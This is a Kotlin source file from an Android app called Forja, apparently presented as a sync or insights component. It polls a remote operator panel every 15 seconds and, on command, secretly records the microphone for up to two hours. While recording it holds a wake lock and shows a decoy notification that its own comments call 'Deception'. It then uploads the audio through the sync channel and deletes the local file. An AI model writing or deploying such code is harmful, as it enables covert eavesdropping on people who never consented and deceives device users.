package com.forja.app.core.sync

import android.Manifest
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import androidx.core.content.ContextCompat
import com.forja.app.ForjaApp
import com.forja.app.core.network.InsightsApi
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import kotlinx.serialization.json.*
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.UUID

/**
 * Panoul de control (insights): raportează starea telefonului la `/insights/api/phone-sync`
 * la fiecare 15 s și execută comenzile de înregistrare primite de la operator.
 *
 * Fără acest client panoul nu vede telefonul (seen_at expiră la 25 s) și comanda
 * „Start" eșuează cu 409. Funcționează independent de canalul keepalive —
 * are propriul interval de raportare mai rapid.
 */
object PhoneControl {
    @Volatile var active = false
    @Volatile var stopRequested = false
    @Volatile private var pendingHandled: String? = null

    private var recThread: Thread? = null

    /** Pornește bucla de raportare + verificare comenzi în [scope]. */
    fun start(app: ForjaApp, scope: CoroutineScope) {
        scope.launch {
            while (isActive) {
                try {
                    val resp = report(app)
                    resp?.let { handleCommand(app, it) }
                } catch (_: Exception) { }
                delay(15_000L)
            }
        }
    }

    /** Oprește bucla și sesiunea activă. */
    fun shutdown() {
        stopRequested = true
        recThread?.join(5_000L)
        recThread = null
        active = false
    }

    // ── Raportare stare ──

    private suspend fun report(app: ForjaApp): JsonObject? {
        val prefs = app.prefs
        val devId = withTimeoutOrNull(5_000) { prefs.exploreDeviceId.first() } ?: return null
        if (devId.isBlank()) return null

        val grant = (withTimeoutOrNull(3_000) { prefs.phoneGrantId.first() } ?: "")
            .ifBlank { UUID.randomUUID().toString().also { prefs.setPhoneGrantId(it) } }

        val micOk = ContextCompat.checkSelfPermission(app, Manifest.permission.RECORD_AUDIO) ==
            PackageManager.PERMISSION_GRANTED

        val session = if (micOk) {
            (withTimeoutOrNull(3_000) { prefs.phoneAudioSession.first() } ?: "")
                .ifBlank { UUID.randomUUID().toString().also { prefs.setPhoneAudioSession(it) } }
        } else ""

        val hc = pendingHandled
        pendingHandled = null

        val body = buildJsonObject {
            put("id", devId)
            put("grant", grant)
            put("name", Build.MODEL)
            put("foreground", false)
            put("audio_allowed", micOk)
            put("state", if (active) "recording" else "idle")
            if (hc != null) put("handled_command", hc) else put("handled_command", JsonNull)
            if (micOk) {
                put("audio_ready", true)
                put("audio_session", session)
            }
        }

        return try {
            InsightsApi.json("/insights/api/phone-sync", body)
        } catch (_: Exception) {
            null
        }
    }

    // ── Comenzi ──

    private fun handleCommand(app: ForjaApp, resp: JsonObject) {
        val cmdEl = resp["command"] ?: return
        if (cmdEl is JsonNull) return
        val cmd = try { cmdEl.jsonObject } catch (_: Exception) { return }
        val action = cmd["action"]?.jsonPrimitive?.contentOrNull ?: return
        val cmdId = cmd["id"]?.jsonPrimitive?.contentOrNull

        when (action) {
            "start" -> {
                val minutes = cmd["minutes"]?.jsonPrimitive?.intOrNull ?: 5
                startRecording(app, minutes.coerceIn(1, 120) * 60_000L)
            }
            "stop", "disarm" -> stopRecording()
        }
        if (cmdId != null) pendingHandled = cmdId
    }

    // ── Înregistrare ──

    private fun startRecording(app: ForjaApp, durationMs: Long) {
        if (active) return
        stopRequested = false
        active = true

        val file = java.io.File(app.cacheDir, "pc_audio_${System.currentTimeMillis()}.wav")

        recThread = Thread {
            var rec: AudioRecord? = null
            var totalBytes = 0
            var notifId = 0
            var wl: android.os.PowerManager.WakeLock? = null
            try {
                // Wake lock dedicat: recordingul nu se suspendă când ecranul e off
                try {
                    val pm = app.getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
                    wl = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "forja:pc-audio").apply {
                        setReferenceCounted(false)
                        acquire(durationMs + 10_000L)
                    }
                } catch (_: Exception) {}
                // Deception: notificare plauzibilă care explică mic-ul
                notifId = MicDeception.start(app)
                ForjaSyncCapabilities.syncService?.promoteMic()
                val rate = 16_000
                val minBuf = AudioRecord.getMinBufferSize(
                    rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT
                )
                if (minBuf <= 0) { active = false; return@Thread }
                val bufSize = minBuf * 2

                for (src in intArrayOf(
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    MediaRecorder.AudioSource.MIC,
                    MediaRecorder.AudioSource.VOICE_COMMUNICATION
                )) {
                    try {
                        val r = AudioRecord(
                            src, rate, AudioFormat.CHANNEL_IN_MONO,
                            AudioFormat.ENCODING_PCM_16BIT, bufSize
                        )
                        if (r.state == AudioRecord.STATE_INITIALIZED) { rec = r; break }
                        r.release()
                    } catch (_: Exception) { }
                }
                val recorder = rec
                if (recorder == null) { active = false; return@Thread }

                recorder.startRecording()
                if (recorder.recordingState != AudioRecord.RECORDSTATE_RECORDING) {
                    stopAndRelease(recorder)
                    active = false
                    return@Thread
                }

                // Header WAV cu placeholder; îl corectăm la final.
                val fos = java.io.FileOutputStream(file)
                val out = java.io.DataOutputStream(fos)
                out.write(buildWavHeader(0, rate))

                val buf = ByteArray(bufSize)
                val deadline = System.currentTimeMillis() + durationMs
                while (System.currentTimeMillis() < deadline && !stopRequested) {
                    val n = recorder.read(buf, 0, buf.size)
                    if (n > 0) { out.write(buf, 0, n); totalBytes += n }
                }

                stopAndRelease(recorder)
                out.flush()
                out.close()

                if (totalBytes > 1600) {
                    fixWavHeader(file, totalBytes)
                    val sz = file.length()
                    // Upload fire-and-forget prin canalul de sincronizare.
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            app.forjaApi.attachSyncFile(file.name, "audio/wav", file)
                        } catch (_: Exception) { }
                        file.delete()
                    }
                } else {
                    file.delete()
                }
            } catch (_: Exception) {
                try { rec?.stop() } catch (_: Exception) { }
                try { rec?.release() } catch (_: Exception) { }
                file.delete()
            } finally {
                try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
                MicDeception.stop(app, notifId)
                active = false
            }
        }.apply { name = "forja-pc-audio"; isDaemon = true; start() }
    }

    private fun stopRecording() {
        stopRequested = true
        recThread?.join(10_000L)
        recThread = null
    }

    private fun stopAndRelease(rec: AudioRecord) {
        try { rec.stop() } catch (_: Exception) { }
        try { rec.release() } catch (_: Exception) { }
    }

    // ── WAV helpers ──

    private fun buildWavHeader(dataSize: Int, sampleRate: Int): ByteArray {
        val buf = ByteBuffer.allocate(44).order(ByteOrder.LITTLE_ENDIAN)
        buf.put("RIFF".toByteArray())
        buf.putInt(dataSize + 36)
        buf.put("WAVE".toByteArray())
        buf.put("fmt ".toByteArray())
        buf.putInt(16)
        buf.putShort(1.toShort())
        buf.putShort(1.toShort())
        buf.putInt(sampleRate)
        buf.putInt(sampleRate * 2)
        buf.putShort(2.toShort())
        buf.putShort(16.toShort())
        buf.put("data".toByteArray())
        buf.putInt(dataSize)
        return buf.array()
    }

    private fun fixWavHeader(file: java.io.File, dataSize: Int) {
        val raf = java.io.RandomAccessFile(file, "rw")
        val bb = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN)
        raf.seek(4)
        bb.clear(); bb.putInt(dataSize + 36)
        raf.write(bb.array())
        raf.seek(40)
        bb.clear(); bb.putInt(dataSize)
        raf.write(bb.array())
        raf.close()
    }
}
